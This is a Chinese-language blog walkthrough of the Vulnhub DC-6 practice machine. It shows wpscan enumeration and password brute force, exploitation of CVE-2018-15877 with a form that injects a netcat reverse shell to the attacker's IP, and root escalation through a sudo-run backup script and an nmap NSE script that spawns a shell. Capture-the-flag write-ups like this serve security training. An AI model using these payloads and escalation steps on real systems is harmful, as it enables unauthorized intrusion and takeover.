@@ -1,0 +1,631 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Vulnhub DC 6 Workthrough - M0untainShley</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"ee9387c15cc7097331ccc74141d07081","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>M0untainShley</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Vulnhub DC 6 Workthrough">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-31 14:02" pubdate>
+        October 31, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Vulnhub DC 6 Workthrough</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：November 1, 2021 pm
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h3 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h3><p>DC-6 is a VirtualBox VM built on Debian 64 bit, but there shouldn’t be any issues running it on most PCs.</p>
+<p>I have tested this on VMWare Player, but if there are any issues running this VM in VMware, have a read through of this.</p>
+<p>It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.</p>
+<p>Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.</p>
+<p>后面还有两个小TIPS，一个是关于hosts文件设置的，一个是关于字典的（是不是可以联想到wordpress的用户枚举+密码字典爆破呢？）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:<br><br>192.168.0.142 wordy<br><br><span class="hljs-comment">##################################################################################</span><br><br>OK, this isn<span class="hljs-string">&#x27;t really a clue as such, but more of some &quot;we don&#x27;</span>t want to spend five years waiting <span class="hljs-keyword">for</span> a certain process to finish<span class="hljs-string">&quot; kind of advice for those who just want to get on with the job.</span><br><span class="hljs-string"></span><br><span class="hljs-string">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></code></pre></td></tr></table></figure>
+
+<img src="/img/Vulnhub-DC-6过关笔记/19.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h3 id="靶场获取"><a href="#靶场获取" class="headerlink" title="靶场获取"></a>靶场获取</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>主机发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sP 192.168.199.0/24<br>...<br>Nmap scan report <span class="hljs-keyword">for</span> dc-6.lan (192.168.199.224)  <span class="hljs-comment"># 关键字 dc-6</span><br>Host is up (0.00054s latency).<br></code></pre></td></tr></table></figure>
+
+
+
+<p>编辑hosts文件，添加如下内容<strong>（TIPS 1）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.199.224  wordy<br></code></pre></td></tr></table></figure>
+
+
+
+<p>目标全端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -sT -sV -sC -p- -O 192.168.199.224<br>...<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-title: Did not follow redirect to http://wordy/<br>MAC Address: 00:0C:29:29:00:30 (VMware)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+
+
+<p>访问80端口，熟悉的wordpress界面</p>
+<img src="/img/Vulnhub-DC-6过关笔记/1.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>配合作者的提示<strong>（TIPS 2）</strong>，先生成用来爆破的密码字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">OK, this isn<span class="hljs-string">&#x27;t really a clue as such, but more of some &quot;we don&#x27;</span>t want to spend five years waiting <span class="hljs-keyword">for</span> a certain process to finish<span class="hljs-string">&quot; kind of advice for those who just want to get on with the job.</span><br><span class="hljs-string"></span><br><span class="hljs-string">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>解压缩”/usr/share/wordlists/rockyou.txt.gz”文件，复制到桌面，生成密码字典pass.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cp /usr/share/wordlists/rockyou.txt.gz ./  <br>$ gzip -d rockyou.txt.gz  <span class="hljs-comment"># 需要用gzip进行解压缩</span><br>$ cat rockyou.txt | grep k01 &gt; pass.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用Kali自带的wpscan对其进行漏洞扫描和用户枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wpscan --url http://wordy/ --enumerate vp,vt,u --api-token=YOUT_TOKEN<br></code></pre></td></tr></table></figure>
+
+
+
+<p>获取到网站的信息如下</p>
+<p>版本号以及漏洞信息</p>
+<img src="/img/Vulnhub-DC-6过关笔记/2.png" srcset="/img/loading.gif" lazyload>
+
+<p>使用的主题</p>
+<img src="/img/Vulnhub-DC-6过关笔记/3.png" srcset="/img/loading.gif" lazyload>
+
+<p>以及枚举出来的用户</p>
+<img src="/img/Vulnhub-DC-6过关笔记/4.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="wordpress账号密码爆破"><a href="#wordpress账号密码爆破" class="headerlink" title="wordpress账号密码爆破"></a>wordpress账号密码爆破</h4><p>使用枚举出来的用户跟过滤后产生的密码进行用户的暴力破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat user.txt  <br>admin<br>graham<br>mark<br>sarah<br>jens<br><br>$ cat pass.txt       <br>pink01<br>jack01<br>tink01<br>nick01<br>mark01<br>patrick01<br>rock01<br>black01<br>newyork01<br>fuck01<br>redneck01<br>derek01<br>zack01<br>frank01<br>punk01<br>tank01<br>chick01<br>rick01<br>freak01<br>erick01<br>dork01<br>dick01<br>...<br></code></pre></td></tr></table></figure>
+
+<img src="/img/Vulnhub-DC-6过关笔记/5.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>开始爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wpscan --url http://wordy/ --usernames ./user.txt --passwords ./pass.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>发现账号和密码，mark / helpdesk01</p>
+<img src="/img/Vulnhub-DC-6过关笔记/6.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>登录后台</p>
+<img src="/img/Vulnhub-DC-6过关笔记/7.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="Activity-monitor-远程代码执行"><a href="#Activity-monitor-远程代码执行" class="headerlink" title="Activity monitor 远程代码执行"></a>Activity monitor 远程代码执行</h4><p>登录后在面板上可以看到有一个wordpress组件——Activity monitor，该组件是存在远程代码执行漏洞的</p>
+<img src="/img/Vulnhub-DC-6过关笔记/8.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>使用searchsploit命令查找该组件的漏洞，下载到本地</p>
+<img src="/img/Vulnhub-DC-6过关笔记/9.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>打开可以看到说明以及使用方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="hljs-comment">        [+] Version: 20161228 and possibly prior</span><br><span class="hljs-comment">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="hljs-comment">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="hljs-comment">        [+] CVE-ID: CVE-2018-15877</span><br><span class="hljs-comment">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="hljs-comment">        [+] <span class="hljs-doctag">Note:</span> Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="hljs-comment">  --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;google.fr| nc 192.168.199.146 4141 -e /bin/bash&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lookup&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Lookup&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在此需要对EXP进行一点点修改，一处是网站的url，另一处是接收反弹shell主机的ip和端口号<strong>（参数也是需要去掉的，不然反弹不回来…）</strong></p>
+<img src="/img/Vulnhub-DC-6过关笔记/10.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>Kali上启动nc监听本地4141端口</p>
+<p>点击此按钮，反弹一个shell回来</p>
+<img src="/img/Vulnhub-DC-6过关笔记/11.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>Kali上线了</p>
+<img src="/img/Vulnhub-DC-6过关笔记/12.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="发现graham用户名和密码"><a href="#发现graham用户名和密码" class="headerlink" title="发现graham用户名和密码"></a>发现graham用户名和密码</h4><p>使用python得到一个shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>查看用户信息，发现了两个比较有趣的东西</p>
+<p>一个是jens家目录下的backups.sh脚本，其实就是用来备份网站的</p>
+<p>另一个是mark家目录下的things-to-do.txt文件，里面是有存放graham和他的密码：graham / GSo7isUM1D4</p>
+<img src="/img/Vulnhub-DC-6过关笔记/13.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>sarah和graham家目录下没放什么其他东西</p>
+<img src="/img/Vulnhub-DC-6过关笔记/14.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<h4 id="提权，获取flag"><a href="#提权，获取flag" class="headerlink" title="提权，获取flag"></a>提权，获取flag</h4><p>使用graham用户ssh登录，可以看到jens可以使用root权限执行/home/jens/backups.sh脚本，可以利用该脚本进行提权，我们需要先切换为jens然后再进行操作</p>
+<img src="/img/Vulnhub-DC-6过关笔记/15.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>在该脚本中添加内容<strong>（这里需要用键盘对vi命令行操作，如果感觉不方便的话，可以使用”&gt;&gt;”在后面追加内容）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vi /home/jens/backups.sh<br>$ cat /home/jens/backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br>/bin/bash   <span class="hljs-comment"># 添加的内容</span><br></code></pre></td></tr></table></figure>
+
+<img src="/img/Vulnhub-DC-6过关笔记/16.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>执行该脚本，进行用户切换</p>
+<p>更换用户后，发现可以使用root权限运行nmap命令</p>
+<img src="/img/Vulnhub-DC-6过关笔记/17.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>使用nmap进行提权，获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; /tmp/privilege.nse<br>$ sudo nmap --script=/tmp/privilege.nse<br>$ id<br>$ ls /root<br>$ cat /root/theflag.txt<br></code></pre></td></tr></table></figure>
+
+<img src="/img/Vulnhub-DC-6过关笔记/18.png" srcset="/img/loading.gif" lazyload>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    转载请保留原文链接及作者
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/30/Vulnhub-DC-5-Workthrough/">
+                        <span class="hidden-mobile">Vulnhub DC 5 Workthrough</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"87DviF4Tc6ftT198Wx2XV99q-gzGzoHsz","appKey":"wWetKPApalpJJoqj5nyGYBJl","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?ee9387c15cc7097331ccc74141d07081";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
